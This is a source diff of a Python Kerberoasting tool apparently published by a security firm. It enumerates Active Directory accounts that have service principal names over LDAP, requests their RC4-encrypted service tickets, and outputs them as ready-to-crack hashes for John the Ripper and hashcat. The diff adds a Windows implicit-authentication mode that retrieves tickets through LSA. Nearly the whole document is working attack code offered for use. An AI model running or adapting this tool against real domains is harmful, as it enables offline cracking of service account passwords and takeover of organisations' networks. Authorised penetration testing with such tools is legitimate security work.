@@ -1,18 +1,19 @@
-#!/usr/bin/python
 # ----------------------------------------------------------------------------
 # "THE BEER-WARE LICENSE" (Revision 42):
-# <eddy (dot) maaalou (at) gmail (dot) com> wrote this file.  As long as you
+# <jean-christophe.delaunay (at) synacktiv.com> wrote this file.  As long as you
 # retain this notice you can do whatever you want with this stuff. If we meet
 # some day, and you think this stuff is worth it, you can buy me a beer in
 # return.   Fist0urs
 # ----------------------------------------------------------------------------
+
+#!/usr/bin/python
 
 # -*- coding: utf-8 -*-
 
 # by Fist0urs
 
 import sys, os
-sys.path.append(os.path.realpath(os.path.dirname(__file__)+"./modules"))
+sys.path.append(os.path.realpath(os.path.join(os.path.dirname(__file__), "modules")))
 
 import argparse
 from random import getrandbits
@@ -21,22 +22,22 @@ import datetime
 from ldap3 import Server, Connection, SIMPLE, \
     SYNC, ALL, SASL, NTLM
 
-import ldap3.core.exceptions
-
 from rom.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5
 from rom.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
-    decrypt_as_rep, decrypt_tgs_rep
+    decrypt_as_rep, decrypt_tgs_rep, extract_tgs_data
 from rom.ccache import CCache, kdc_rep2ccache
 from rom.util import epoch2gt, gt2epoch
 
 
 LDAP_PORT="389"
 
+# All not disabled user accounts except 'krbtg' account
 LDAP_QUERY = "(&\
               (objectClass=user)\
               (servicePrincipalName=*)\
               (!(objectClass=computer))\
               (!(cn=krbtgt))\
+              (!(userAccountControl:1.2.840.113556.1.4.803:=2))\
               )"
 
 ATTRIBUTES_TO_RETRIEVE = ['sAMAccountName',
@@ -66,21 +67,12 @@ dico_etypes={'1':'des-cbc-crc',
              '24':'rc4-hmac-exp',
              '65':'subkey-keymaterial'}
 
-# Console colors
-W = '\033[0m'  # white (normal)
-R = '\033[31m'  # red
-G = '\033[32m'  # green
-O = '\033[33m'  # orange
-B = '\033[34m'  # blue
-P = '\033[35m'  # purple
-C = '\033[36m'  # cyan
-GR = '\033[37m'  # gray
-
 verbose_level = 0
 
 class AttackParameters():
     def __init__(self, user_account = None, realm = None,
                 DC_addr = None, password = None,
+                implicit_authentication = None,
                 sid = None, key = None,
                 auth_gssapi = False, list_spn = None,
                 tgt = None, session_key = None,
@@ -92,6 +84,7 @@ class AttackParameters():
         self.realm = realm
         self.DC_addr = DC_addr
         self.password = password
+        self.implicit_authentication = implicit_authentication
         self.sid = sid
         self.auth_gssapi = auth_gssapi
         self.key = key
@@ -106,8 +99,7 @@ class AttackParameters():
     # We ask a TGT with PAC when LDAP connection is made through gssapi
     def get_TGT(self, need_pac = False):
         DC_addr = self.DC_addr
-        WRITE_STDOUT(G + "\nAsking " + B + '\'' + DC_addr\
-                           + '\'' + G + " for a TGT\n" + W)
+        WRITE_STDOUT("\nAsking '" + DC_addr + "' for a TGT\n")
 
         WRITE_STDOUT('  [+] Building AS-REQ for %s...' % DC_addr)
 
@@ -142,13 +134,11 @@ class AttackParameters():
         self.tgt = as_rep['ticket']
         WRITE_STDOUT(' Done!\n')
 
-        WRITE_STDOUT(G + "TGT retrieved for user " + B + '\''\
-                         + self.user_account + '\'\n' + W)
+        WRITE_STDOUT("TGT retrieved for user '" + self.user_account + "'\n")
 
 
     def Parse_TGT_File(self, tgt_file):
-        WRITE_STDOUT('\n' + P + '[+] Parsing TGT file '+ B + '\'' + tgt_file \
-        + '\'\n' + W)
+        WRITE_STDOUT("\n[+] Parsing TGT file '" + tgt_file + "'\n")
         tgt_cache_data = CCache.load(tgt_file)
 
         tgt_credentials =  tgt_cache_data.credentials[0]
@@ -162,14 +152,13 @@ class AttackParameters():
         WRITE_STDOUT('  [+] Extracting TGT and session key... Done!\n\n')
 
         if tgt_credentials.key.keytype != 23:
-            WRITE_STDOUT(R + '[+] Warning, encryption type is '\
-                        + B + '\'' + dico_etypes[str(tgt_credentials.key.keytype)]\
-                        + '\'' + R + ' asking for a new TGT in RC4...\n' + W)
+            WRITE_STDOUT("[+] Warning, encryption type is '" + dico_etypes[str(tgt_credentials.key.keytype)]\
+                        + "' asking for a new TGT in RC4...\n")
             self.tgt = self.Ask_TGT_RC4()
 
     def TGS_attack(self):
-        WRITE_STDOUT('\n' + P + '[+] Iterating through SPN and building '\
-                    + "corresponding TGS-REQ\n" + W)
+        WRITE_STDOUT('\n[+] Iterating through SPN and building '\
+                    + "corresponding TGS-REQ\n")
 
         if self.outputfile_path != None:
             try:
@@ -205,7 +194,6 @@ class AttackParameters():
             if not tgs_rep:
                 continue
 
-            # horrible asn1 structure...
             c=""
 
             for i in tgs_rep['ticket']['enc-part']['cipher'].asNumbers():
@@ -213,15 +201,15 @@ class AttackParameters():
                 c =c + hex(i).replace("0x",'').zfill(2)
                 existing_SPN = 1
 
-            sys.stdout.write("$krb5tgs$23$*" + samaccountname + "$"\
-                + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
-                + c[:32] + "$" + c[32:] + '\n')
-            sys.stdout.flush()
-
             if self.outputfile_path != None:
-                outputfile.write("$krb5tgs$23$*" + samaccountname + "$"\
+                outputfile.write(samaccountname + ":$krb5tgs$23$*" + samaccountname + "$"\
                 + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
                 + c[:32] + "$" + c[32:] + '\n')
+            else:
+                sys.stdout.write(samaccountname + ":$krb5tgs$23$*" + samaccountname + "$"\
+                + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
+                + c[:32] + "$" + c[32:] + '\n')
+                sys.stdout.flush()
 
         if self.outputfile_path != None:
             outputfile.close()
@@ -238,21 +226,21 @@ class AttackParameters():
         # All went good!
         if existing_SPN != 0:
             if self.outputfile_path != None:
-                WRITE_STDOUT(O + "All done! All tickets are stored in a "\
-                + "ready-to-crack format in " + B + '\'' + self.outputfile_path + '\''\
-                + O + " and SPN are stored in " + B + '\'' + dirname + filename\
-                + '\'\n' + W)
+                WRITE_STDOUT("All done! All tickets are stored in a "\
+                + "ready-to-crack format in '" + self.outputfile_path\
+                + "' and SPN are stored in '" + dirname + filename\
+                + "'\n")
         else:
-            sys.stderr.write(O + "There are no accounts with an SPN \n" + W)
+            sys.stderr.write("There are no accounts with an SPN \n")
             sys.stderr.flush()
 
     def forge_custom_TGS_REQ(self, target_service, target_host,
                              subkey, nonce, current_time, spn,
                              samaccountname):
 
-        WRITE_STDOUT('  [+] Building TGS-REQ for SPN ' + B + '\'' + spn\
-                +'\'' + W + ' and account ' + B + '\'' + samaccountname\
-                + '\'' + W + '...')
+        WRITE_STDOUT("  [+] Building TGS-REQ for SPN '" + spn\
+                +"' and account '" + samaccountname\
+                + "'...\n")
 
         tgs_req = build_tgs_req(self.realm, target_service, target_host,
                                 self.realm, self.user_account, self.tgt,
@@ -276,9 +264,9 @@ def ldap_get_all_users_spn(AttackParameters, port):
 
     # Kerberos authentication
     if AttackParameters.auth_gssapi :
-        WRITE_STDOUT(G + "\nConnecting to " + B + '\'' + AttackParameters.DC_addr \
-                    + '\'' + W + G + " using ldap protocol and"\
-                    + " Kerberos authentication!\n" + W)
+        WRITE_STDOUT("\nConnecting to '" + AttackParameters.DC_addr \
+                    + "' using ldap protocol and"\
+                    + " Kerberos authentication!\n")
 
         WRITE_STDOUT('  [+] Creating ticket ccache file %r...' % ccache_file)
         cc = CCache((AttackParameters.realm, AttackParameters.user_account))
@@ -294,8 +282,8 @@ def ldap_get_all_users_spn(AttackParameters, port):
 
     # NTLM authentication
     else :
-        WRITE_STDOUT(G + "Connecting to " + B + '\'' + AttackParameters.DC_addr + '\'' + W +\
-                         G + " using ldap protocol and NTLM authentication!\n" + W)
+        WRITE_STDOUT("Connecting to '" + AttackParameters.DC_addr\
+                     +"' using ldap protocol and NTLM authentication!\n")
 
         s = Server(AttackParameters.DC_addr, port=389, get_info=ALL)
 
@@ -310,14 +298,14 @@ def ldap_get_all_users_spn(AttackParameters, port):
     # Now we should be connected to the DC through LDAP
     try :
         c.open()
-    except ldap3.core.exceptions.LDAPSocketOpenError as e:
-        WRITE_STDOUT(R + "ldap connection error: %s\n" % e + W)
+    except :
+        WRITE_STDOUT("ldap connection error: %s\n")
         sys.exit(1)
 
     try :
         r = c.bind()
     except:
-        WRITE_STDOUT(R + "Cannot connect to ldap, exiting.\n" + W)
+        WRITE_STDOUT("Cannot connect to ldap, exiting.\n")
         sys.exit(1)
 
     # Query to find all accounts having a servicePrincipalName
@@ -330,7 +318,7 @@ def ldap_get_all_users_spn(AttackParameters, port):
             )
 
     if not c.response:
-        WRITE_STDOUT(R + "Cannot find any SPN, wrong user/credentials?\n" + W)
+        WRITE_STDOUT("Cannot find any SPN, wrong user/credentials?\n")
         sys.exit(1)
 
     WRITE_STDOUT('  [+] Retrieving all SPN and corresponding accounts...')
@@ -369,8 +357,8 @@ def ldap_get_all_users_spn(AttackParameters, port):
     # Disconnecting from DC
     WRITE_STDOUT(' Done!\n')
     c.unbind()
-    WRITE_STDOUT(G + "Successfully disconnected from "+ B + '\''\
-                 + AttackParameters.DC_addr + '\'\n' + W)
+    WRITE_STDOUT("Successfully disconnected from '"\
+                 + AttackParameters.DC_addr + "'\n")
 
     # write to SPN_outputfile
     if AttackParameters.outputfile_path != None:
@@ -407,34 +395,36 @@ def parse_TGS_REP(sock, subkey, spn, samaccountname, kdc_addr):
 
         # MAGIC, not RC4 received...
         if len(tgs_rep) == 2 and not tgs_rep_enc:
-            WRITE_STDOUT(R + ' Only rc4-hmac supported and encryption type\
+            WRITE_STDOUT(' Only rc4-hmac supported and encryption type\
                             is \'%s\'. Skipping this account...\n\n' %\
-                            dico_etypes[tgs_rep] + W)
+                            dico_etypes[tgs_rep])
             return None, None
         else:
-            WRITE_STDOUT(' Done!\n' + G + '  [+] Got encrypted ticket for SPN '\
-                     + B + '\'' + spn + '\'' + G + ' and account ' + B + '\''\
-                     + samaccountname + '\'\n' + W)
+            WRITE_STDOUT(" Done!\n[+] Got encrypted ticket for SPN '"\
+                     + spn + "' and account '" + samaccountname + "'\n")
             return tgs_rep, tgs_rep_enc
 
 
 def parse_arguments():
-    parser = argparse.ArgumentParser(description="Script to retrieve all accounts\
-    having an SPN and retrieving their TGS in rc4-hmac encrypted blob in John The Ripper\
-    'krb5tgs' format and hashcat's one, by Fist0urs")
+    parser = argparse.ArgumentParser(description="Tool to retrieve all accounts\
+    having an SPN and their TGS in arc4-hmac encrypted blob. Output is ready-to-crack for John The Ripper\
+    'krb5tgs' and hashcat 13100 formats, by jean-christophe.delaunay <at> synacktiv.com")
 
     group = parser.add_mutually_exclusive_group(required=False)
     group2 = parser.add_mutually_exclusive_group(required=False)
 
-    parser.add_argument('-u', '--username', required=True, help="format must be\
+    parser.add_argument('--implicit', required=False, help="use Windows implicit\
+    authentication mechanism. Format is (FQDN/IP)_DomainController[:port]@FQDN_Domain. eg: 192.168.13.13:389@infra.kerberos.com")
+
+    parser.add_argument('-u', '--username', required=False, help="format must be\
     userName@DomainFQDN. eg: fistouille@infra.kerberos.com")
 
-    parser.add_argument('-d', '--domainControlerAddr', required=True, help="domain\
+    parser.add_argument('-d', '--domainControlerAddr', required=False, help="domain\
     Controler FQDN. Can be an IP but ldap retrieval through kerberos method will not\
     work (-k)")
 
     parser.add_argument('-o', '--outputfile', required=False, help="outputfile where\
-    to store results")
+    to store results and extracted accounts having an SPN (to be used with '-i' afterward)")
 
     parser.add_argument('-iK', '--input_TGT_File', required=False, help="user's provided file\
     containing TGT. Parsing is determined by extension (.ccache for Linux\
@@ -451,7 +441,7 @@ def parse_arguments():
 
     parser.add_argument('--delta', required=False,
     help="set time delta in Kerberos tickets. Useful when DC is not on the same timezone.\
-    Format is \"(+/-)hours:minutes:seconds\", e.g. --delta=\"+00:05:00\" or --delta=\"-02:00:00\"")
+    Format is \"(+/-)hours:minutes:seconds\", eg. --delta=\"+00:05:00\" or --delta=\"-02:00:00\"")
 
     group2.add_argument('-k', '--user_sid', required=False, help="force ldap SPN\
     retrieval through kerberos, sid is mandatory. Cannot be used with '-i'")
@@ -471,86 +461,228 @@ if __name__ == '__main__':
     from getpass import getpass
 
     options = parse_arguments()
-    user_name, user_realm = options.username.split('@', 1)
-
-    DataSubmitted = AttackParameters(DC_addr = options.domainControlerAddr.lower(),
-                                 user_account = user_name,
-                                 realm = user_realm.upper(),
-                                 outputfile_path = options.outputfile)
-
-    ccache_file = ccache_file + str(os.geteuid())
-
-    if options.password :
-        DataSubmitted.password = options.password
-        DataSubmitted.key = (RC4_HMAC, ntlm_hash(DataSubmitted.password).digest())
-    elif options.hash:
-        lm_hash, nt_hash = options.hash.split(':')
-        # assume right format
-        if len(lm_hash) != 32 or len(nt_hash) != 32:
-            WRITE_STDOUT("Error: format must be \"LM:NT\"")
-            sys.exit(1)
-        DataSubmitted.key = (RC4_HMAC, nt_hash.decode('hex'))
-        DataSubmitted.password = options.hash
-        assert len(DataSubmitted.key[1]) == 16
-    else:
-        DataSubmitted.password = getpass('Password: ')
-        DataSubmitted.key = (RC4_HMAC, ntlm_hash(DataSubmitted.password).digest())
-
-    if options.user_sid :
-        DataSubmitted.sid = options.user_sid
-        DataSubmitted.auth_gssapi = True
-    elif options.inputfile_spn :
-        try:
-            inputfile_spn = open(options.inputfile_spn, 'r')
-
-            WRITE_STDOUT(G + "Retrieving sAMAccountName "\
-                            + "and servicePrincipalName from file " \
-                            + B + '\'' + options.inputfile_spn +\
-                            '\'' + W + G + "..." + W)
-
-            DataSubmitted.list_spn = construct_list_spn_from_file(inputfile_spn)
-            WRITE_STDOUT(" Done!\n")
-        except:
-            WRITE_STDOUT(R + "Cannot open " + B + '\'' + \
-                            options.inputfile_spn + '\', exiting\n' + W)
-            sys.exit(1)
-
-    if options.input_TGT_File :
-        DataSubmitted.Parse_TGT_File(options.input_TGT_File)
 
     if options.verbose:
         verbose_level = 1
 
-    if options.delta:
-        sign = options.delta[0]
-        time_array = map(int, options.delta[1:].split(':'))
-
-        if sign == '+':
-            DataSubmitted.time_delta = datetime.timedelta(hours=time_array[0], minutes=time_array[1], seconds=time_array[2]).total_seconds()
-        elif sign == '-':
-            DataSubmitted.time_delta = - datetime.timedelta(hours=time_array[0], minutes=time_array[1], seconds=time_array[2]).total_seconds()
-        else:
-            sys.stderr.write(O + "Sign must be '+' or '-'. Exiting. \n" + W)
+    # assume implicit authentication
+    if options.implicit:
+        try:
+            from rom.rich import ConnectToLDAP, LDAPsearch, KerberosInit, Get_TGS
+            from ctypes import c_char_p as PCHAR
+        except ImportError:
+            sys.stderr.write("Cannot import ctypes related modules. Must be used on Windows. Exiting")
             sys.stderr.flush()
             sys.exit(1)
 
-    # launching attack!
 
-    # file containing SPN is provided
-    if DataSubmitted.list_spn:
-        if not DataSubmitted.tgt:
-            DataSubmitted.get_TGT()
-        DataSubmitted.TGS_attack()
-    else:
-        # authentification through Kerberos
-        if DataSubmitted.auth_gssapi:
-            if not DataSubmitted.tgt:
-                DataSubmitted.get_TGT(need_pac = True)
-            DataSubmitted.list_spn = ldap_get_all_users_spn(DataSubmitted, LDAP_PORT)
-            DataSubmitted.TGS_attack()
-        # authentification through NTLM
+        outputfile = ""
+        if options.outputfile != None:
+            try:
+                outputfile = open(options.outputfile,'w')
+            except:
+                WRITE_STDOUT('[-] Cannot open \'%s\' exiting. \n' % self.outputfile_path)
+                sys.exit(1)
+
+        domainControlerAddr, user_realm = options.implicit.split('@')
+
+        if options.inputfile_spn:
+            try:
+                inputfile_spn = open(options.inputfile_spn, 'r')
+
+                WRITE_STDOUT("[+] Retrieving sAMAccountName "\
+                             "and servicePrincipalName from file '" \
+                             + options.inputfile_spn + "'...\n")
+
+                list_spn = construct_list_spn_from_file(inputfile_spn)
+                WRITE_STDOUT(" Done!\n")
+            except:
+                WRITE_STDOUT("[-] Cannot open '" + options.inputfile_spn + "' exiting\n")
+                sys.exit(1)
+        # Retrieve spn through LDAP
         else:
-            DataSubmitted.list_spn = ldap_get_all_users_spn(DataSubmitted, LDAP_PORT)
+            pDN = PCHAR("DC="+",DC=".join(user_realm.upper().split('.')))
+
+            pFilter = PCHAR(LDAP_QUERY)
+
+            Attributes = ["sAMAccountName", "servicePrincipalName", "memberOf", "primaryGroupID", 0]
+            pAttributes = (PCHAR * len(Attributes))(*Attributes)
+
+            WRITE_STDOUT("\nConnecting to '" + domainControlerAddr \
+                    + "' using ldap protocol and"\
+                    + " Windows implicit authentication...")
+
+            hLDAPConnection = ConnectToLDAP(domainControlerAddr)
+
+            if hLDAPConnection == 0:
+                sys.exit(1)
+
+            WRITE_STDOUT(" Done!\n")
+
+            WRITE_STDOUT("[+] Searching for all accounts having an SPN...")
+
+            list_spn = LDAPsearch(hLDAPConnection, pDN, pFilter, pAttributes)
+
+            if list_spn == 0:
+                WRITE_STDOUT("\n[-] Cannot find any SPN, exiting.")
+                sys.exit(1)
+            else:
+                WRITE_STDOUT(" Done!\n")
+
+        dirname = ""
+        filename = ""
+        if options.outputfile != None:
+            # where are stored SPN
+            dirname = os.path.dirname(options.outputfile)
+            # current dir
+            if dirname == '':
+                dirname = './'
+            else:
+                dirname = dirname + '/'
+            filename = os.path.basename(options.outputfile)
+            filename = 'SPN_' + filename
+            outputfile_spn = open(dirname + filename, 'w')
+
+            #iterate through SPN
+            for accounts in list_spn:
+                line_to_write = accounts['samaccountname']+'$'\
+                                +accounts['serviceprincipalname']
+                if accounts.has_key('memberof'):
+                    line_to_write = line_to_write + '$' + accounts['memberof']
+                if accounts.has_key('primarygroupid'):
+                    line_to_write = line_to_write + '$primaryGroupID:'\
+                                    + accounts['primarygroupid']
+                outputfile_spn.write(line_to_write + '\n')
+            outputfile_spn.close()
+
+        # get current logon context
+
+        WRITE_STDOUT("[+] Getting current user's logon context...")
+
+        hLsaConnection, dwKerberosAuthenticationPackageId = KerberosInit()
+
+        if hLsaConnection == None or dwKerberosAuthenticationPackageId == None:
+            WRITE_STDOUT("\n[-] Cannot acquire handle on LSA and/or Kerberos authentication Package ID, exiting.")
+            sys.exit(1)
+
+        WRITE_STDOUT(" Done!\n")
+
+        WRITE_STDOUT('[+] Iterating through SPN and asking for corresponding TGS...\n')
+        for SPNentry in list_spn:
+            samaccountname = SPNentry["samaccountname"]
+            spn = SPNentry["serviceprincipalname"]
+            target_service, target_host = spn.split('/', 1)
+
+            WRITE_STDOUT('  [+] Retrieving ticket for account \"%s\" and SPN \"%s\"\n' %(samaccountname, spn))
+            data = Get_TGS(hLsaConnection, dwKerberosAuthenticationPackageId, SPNentry)
+
+            if data == 0:
+                continue
+
+            tgs_rep = extract_tgs_data(data.strip().decode("hex"))
+
+            payload = ""
+
+            for i in tgs_rep['enc-part']['cipher'].asNumbers():
+                # zfill make sure a leading '0' is added when needed
+                payload =payload + hex(i).replace("0x",'').zfill(2)
+                existing_SPN = 1
+
+            if options.outputfile != None:
+                outputfile.write(samaccountname+":$krb5tgs$23$*" + samaccountname + "$"\
+                + domainControlerAddr.replace(':', '-') + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
+                + payload[:32] + "$" + payload[32:] + '\n')
+            else:
+                sys.stdout.write(samaccountname+":$krb5tgs$23$*" + samaccountname + "$"\
+                + domainControlerAddr.replace(':', '-') + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
+                + payload[:32] + "$" + payload[32:] + '\n')
+                sys.stdout.flush()
+
+        if options.outputfile != None:
+            WRITE_STDOUT("All done! All tickets are stored in a "\
+                            + "ready-to-crack format in '" + options.outputfile\
+                            + "' and SPN are stored in '" + dirname + filename\
+                            + "'\n")
+    # explicit authentication
+    else:
+        user_name, user_realm = options.username.split('@', 1)
+        DataSubmitted = AttackParameters(DC_addr = options.domainControlerAddr.lower(),
+                                     user_account = user_name,
+                                     realm = user_realm.upper(),
+                                     outputfile_path = options.outputfile)
+
+        # linux only
+        try:
+            ccache_file = ccache_file + str(os.geteuid())
+        except:
+            ccache_file = None
+
+        if options.password :
+            DataSubmitted.password = options.password
+            DataSubmitted.key = (RC4_HMAC, ntlm_hash(DataSubmitted.password).digest())
+        elif options.hash:
+            lm_hash, nt_hash = options.hash.split(':')
+            # assume right format
+            if len(lm_hash) != 32 or len(nt_hash) != 32:
+                WRITE_STDOUT("Error: format must be \"LM:NT\"")
+                sys.exit(1)
+            DataSubmitted.key = (RC4_HMAC, nt_hash.decode('hex'))
+            DataSubmitted.password = options.hash
+            assert len(DataSubmitted.key[1]) == 16
+        else:
+            DataSubmitted.password = getpass('Password: ')
+            DataSubmitted.key = (RC4_HMAC, ntlm_hash(DataSubmitted.password).digest())
+
+        if options.user_sid :
+            DataSubmitted.sid = options.user_sid
+            DataSubmitted.auth_gssapi = True
+        elif options.inputfile_spn :
+            try:
+                inputfile_spn = open(options.inputfile_spn, 'r')
+
+                WRITE_STDOUT("Retrieving sAMAccountName "\
+                                + "and servicePrincipalName from file '" \
+                                + options.inputfile_spn + "'...")
+
+                DataSubmitted.list_spn = construct_list_spn_from_file(inputfile_spn)
+                WRITE_STDOUT(" Done!\n")
+            except:
+                WRITE_STDOUT("Cannot open '" + options.inputfile_spn + "', exiting\n")
+                sys.exit(1)
+
+        if options.input_TGT_File :
+            DataSubmitted.Parse_TGT_File(options.input_TGT_File)
+
+        if options.delta:
+            sign = options.delta[0]
+            time_array = map(int, options.delta[1:].split(':'))
+
+            if sign == '+':
+                DataSubmitted.time_delta = datetime.timedelta(hours=time_array[0], minutes=time_array[1], seconds=time_array[2]).total_seconds()
+            elif sign == '-':
+                DataSubmitted.time_delta = - datetime.timedelta(hours=time_array[0], minutes=time_array[1], seconds=time_array[2]).total_seconds()
+            else:
+                sys.stderr.write("Sign must be '+' or '-'. Exiting. \n")
+                sys.stderr.flush()
+                sys.exit(1)
+
+        # launching attack!
+
+        # file containing SPN is provided
+        if DataSubmitted.list_spn:
             if not DataSubmitted.tgt:
                 DataSubmitted.get_TGT()
             DataSubmitted.TGS_attack()
+        else:
+            # authentification through Kerberos
+            if DataSubmitted.auth_gssapi:
+                if not DataSubmitted.tgt:
+                    DataSubmitted.get_TGT(need_pac = True)
+                DataSubmitted.list_spn = ldap_get_all_users_spn(DataSubmitted, LDAP_PORT)
+                DataSubmitted.TGS_attack()
+            # authentification through NTLM
+            else:
+                DataSubmitted.list_spn = ldap_get_all_users_spn(DataSubmitted, LDAP_PORT)
+                if not DataSubmitted.tgt:
+                    DataSubmitted.get_TGT()
+                DataSubmitted.TGS_attack()
